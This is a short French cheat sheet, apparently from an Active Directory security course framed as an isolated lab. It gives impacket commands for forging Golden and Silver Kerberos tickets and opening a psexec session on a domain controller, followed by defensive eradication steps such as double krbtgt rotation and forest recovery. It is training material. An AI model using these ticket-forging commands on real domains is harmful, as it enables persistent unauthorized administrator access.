# Persistance & éradication — aide-mémoire (lab isolé GOAD-X uniquement)

## Golden Ticket (impacket)
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain <dom> Administrator
export KRB5CCNAME=Administrator.ccache ; impacket-psexec -k -no-pass <dc>

## Silver Ticket (ciblé)
impacket-ticketer -nthash <service_hash> -domain-sid <SID> -domain <dom> -spn cifs/<host> Administrator

## Éradication (côté défense) — LA compétence clé
# 1) Rotation krbtgt x2 avec délai de réplication entre les deux :
#    New-KrbtgtKeys.ps1 (script Microsoft officiel)
# 2) Révoquer certificats suspects (module 40/43) ; vérifier NTAuth + msDS-KeyCredentialLink
# 3) Nettoyer AdminSDHolder, sIDHistory, comptes/GPO ajoutés
# 4) Compromission profonde -> Forest Recovery (module 29)
